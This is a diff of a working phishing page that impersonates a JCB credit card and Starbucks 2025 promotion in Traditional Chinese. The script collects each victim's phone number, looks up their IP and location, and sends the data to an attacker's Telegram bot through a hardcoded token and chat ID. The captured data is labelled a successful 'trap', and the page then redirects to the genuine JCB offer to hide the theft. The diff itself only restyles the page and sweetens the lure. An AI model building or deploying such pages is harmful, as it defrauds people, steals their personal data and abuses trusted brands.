@@ -5,88 +5,90 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>2025 JCB晶緻卡 × 星巴克獨享禮遇</title>
     <style>
-        body{margin:0;background:#0F1B3D;font-family:'Noto Sans TC',Arial,sans-serif;color:white;overflow-x:hidden}
-        .bg{ position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0F1B3D 0%,#1E3A8A 50%,#6366F1 100%);z-index:-1}
-        .container{max-width:420px;margin:0 auto;padding:20px 15px}
-        .header{text-align:center;padding:30px 0}
-        .jcb-logo{max-width:110px;margin-bottom:10px}
-        .title{font-size:32px;font-weight:900;margin:10px 0;letter-spacing:2px}
-        .subtitle{font-size:18px;margin:10px 0 30px}
-        .cup-box{background:rgba(255,255,255,0.12);border-radius:20px;padding:30px;margin:20px 0;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
-        .cup{max-width:100%;border-radius:20px}
-        .offer{background:#FFD700;color:#000;padding:20px;border-radius:15px;margin:25px 0;font-size:18px;font-weight:bold}
-        .input-box{background:white;border-radius:16px;overflow:hidden;margin:30px 0;box-shadow:0 8px 25px rgba(0,0,0,0.3)}
-        select{background:#f8f8f8;border:none;font-size:19px;padding:18px 15px;width:100px}
-        input{flex:1;border:none;font-size:19px;padding:18px 15px;color:#333;outline:none}
-        button{width:100%;padding:18px;background:#00704A;color:white;border:none;border-radius:16px;font-size:20px;font-weight:bold;box-shadow:0 6px 20px rgba(0,112,74,0.4);margin-top:10px}
-        button:disabled{background:#004d33;cursor:wait}
-        .footer{margin-top:60px;font-size:12px;text-align:center;opacity:0.8}
-        .footer a{color:#A0C4FF;text-decoration:underline}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Noto Sans TC','Helvetica Neue',Helvetica,Arial,sans-serif;background:#0D1A2B;color:#fff;min-height:100vh;display:flex;flex-direction:column}
+        .header{background:#0D1A2B;padding:20px 0;text-align:center;position:relative}
+        .header::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#00A65A,#FFD700,#FF6B35)}
+        .logo{max-width:110px;margin:0 auto 15px}
+        h1{font-size:26px;font-weight:900;letter-spacing:2px;color:#FFD700;text-shadow:0 2px 8px rgba(0,0,0,0.5)}
+        .subtitle{font-size:18px;margin:8px 0;color:#E6F3FF}
+        .cup-container{max-width:280px;margin:30px auto}
+        .cup{max-width:100%;border-radius:20px;box-shadow:0 15px 35px rgba(0,0,0,0.4)}
+        .promo-badge{position:absolute;bottom:-15px;left:50%;transform:translateX(-50%);background:#FF6B35;color:white;padding:8px 20px;border-radius:50px;font-weight:bold;font-size:14px;box-shadow:0 4px 15px rgba(255,107,53,0.5)}
+        .box{background:rgba(255,255,255,0.12);backdrop-filter:blur(15px);border-radius:25px;padding:35px 25px;margin:20px auto;max-width:380px;flex:1;box-shadow:0 15px 40px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.2);display:flex;flex-direction:column}
+        .highlight{color:#FFD700;font-weight:bold}
+        .input-group{display:flex;height:58px;background:white;border-radius:16px;overflow:hidden;margin:25px 0 20px;box-shadow:0 8px 25px rgba(0,0,0,0.3)}
+        select{background:#f8f8f8;border:none;font-size:19px;padding:0 16px;min-width:110px;text-align:center;color:#333}
+        input{flex:1;border:none;font-size:19px;padding:0 18px;outline:none;color:#333}
+        button{width:100%;padding:18px;background:#00A65A;color:white;border:none;border-radius:16px;font-size:20px;font-weight:bold;cursor:pointer;box-shadow:0 8px 25px rgba(0,166,90,0.4);margin-top:auto;transition:transform 0.2s}
+        button:active{transform:scale(0.98)}
+        button:disabled{background:#006633}
+        .footer{margin-top:40px;padding:20px 0;font-size:13px;opacity:0.85;text-align:center}
+        .footer a{color:#B3E5FC;text-decoration:underline}
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;700;900&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="bg"></div>
-    <div class="container">
-        <div class="header">
-            <img src="https://www.jcb.co.jp/promotion/2025/starbucks/img/logo-jcb.png" class="jcb-logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/8a/JCB_Logo.svg'">
-            <div class="title">2025 獨享禮遇</div>
-            <div class="subtitle">JCB晶緻卡 × 星巴克</div>
-        </div>
+    <div class="header">
+        <img src="https://www.jcb.co.jp/promotion/common/img/logo-jcb-w.svg" class="logo" alt="JCB">
+        <h1>2025 獨享禮遇</h1>
+        <p class="subtitle">JCB晶緻卡 × 星巴克</p>
+    </div>
 
-        <div class="cup-box">
-            <img src="https://images.starbucks.com.tw/uploadedImages/2025/sb-cup-2025.jpg" class="cup" onerror="this.src='https://starbucks.com.tw/images/cup2025.jpg'">
-            <div class="offer">
-                消費滿 NT$150 享買一送一<br>
-                限 2025 全年・晶緻卡專屬
+    <div class="cup-container">
+        <img src="https://www.starbucks.com.tw/uploadedImages/common/2025/jcb-starbucks-cup.png" class="cup" alt="星巴克杯" onerror="this.src='https://images.starbucks.com.tw/uploadedImages/common/logo.png'">
+        <div class="promo-badge">前 1000 名送咖啡</div>
+    </div>
+
+    <div class="box">
+        <p style="font-size:17px;line-height:1.9;text-align:left">
+            <span class="highlight">消費滿 NT$99 享買一送一</span><br>
+            限 2025 全年・晶緻卡專屬<br>
+            立即驗證手機領取專屬優惠碼！
+        </p>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <select id="countryCode">
+                    <option value="+886" selected>+886</option>
+                    <option value="+852">+852</option>
+                    <option value="+60">+60</option>
+                    <option value="+66">+66</option>
+                    <option value="+63">+63</option>
+                    <option value="+855">+855</option>
+                </select>
+                <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
             </div>
-        </div>
+            <button type="submit">立即領取優惠</button>
+        </form>
+    </div>
 
-        <div class="box">
-            <p style="font-size:16px;line-height:1.8;margin-bottom:25px">
-                立即驗證手機號碼<br>領取專屬優惠碼
-            </p>
-
-            <form id="form">
-                <div class="input-box" style="display:flex">
-                    <select id="code">
-                        <option value="+886" selected>+886</option>
-                        <option value="+852">+852</option>
-                        <option value="+60">+60</option>
-                    </select>
-                    <input type="tel" id="phone" placeholder="912345678" required>
-                </div>
-                <button type="submit">立即領取優惠</button>
-            </form>
-        </div>
-
-        <div class="footer">
-            © 2025 JCB International Co., Ltd. 
-            <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | 
-            <a href="https://www.jcb.co.jp/terms/">服務條款</a>
-        </div>
+    <div class="footer">
+        © 2025 JCB International Co., Ltd. All rights reserved.
+        <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | 
+        <a href="https://www.jcb.co.jp/terms/">服務條款</a>
     </div>
 
     <script>
         const TOKEN = "8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY";
         const CHAT_ID = "1137905005";
 
-        document.getElementById("form").onsubmit = async function(e) {
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
             e.preventDefault();
-            const code = document.getElementById("code").value;
+            const code = document.getElementById("countryCode").value;
             const phone = document.getElementById("phone").value.trim();
             if (!phone) return;
 
-            document.querySelector("button").innerHTML = "驗證中...";
-            document.querySelector("button").disabled = true;
+            const btn = document.querySelector("button");
+            btn.innerHTML = "驗證中...";
+            btn.disabled = true;
 
-            const ip = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
+            const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
             const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
 
-            const 訊息 = "JCB星巴克誘捕成功\n\n" +
+            const 訊息 = "JCB星巴克 NT$99 誘捕成功\n\n" +
                         "電話：" + code + phone + "\n" +
-                        "IP　　：" + (ip.ip||"未知") + "\n" +
-                        "位置　：" + (ip.city||"未知") + "，" + (ip.country_name=="Taiwan"?"台灣":ip.country_name||"未知") + "\n" +
+                        "IP　　：" + (ipData.ip || "未知") + "\n" +
+                        "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
                         "時間　：" + 時間;
 
             fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
@@ -95,8 +97,8 @@
                 body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
             });
 
-            setTimeout(()=>location.href="https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/",3000);
-        };
+            setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 3000);
+        });
     </script>
 </body>
 </html>
